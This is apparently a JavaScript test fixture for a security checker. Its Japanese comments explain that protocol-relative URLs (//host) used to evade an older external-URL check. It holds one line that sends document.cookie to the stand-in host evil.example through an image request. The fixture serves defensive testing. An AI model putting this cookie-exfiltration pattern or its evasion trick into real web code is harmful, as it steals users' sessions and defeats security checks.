'use strict';
// fixture: プロトコル相対 URL（//host）による外部送信。
// https?:// を持たないので、旧来の「外部 URL」検査を素通りしていた（独立検証の実測1）。
var i = new Image();
i.src = "//evil.example/collect?v=" + document.cookie;
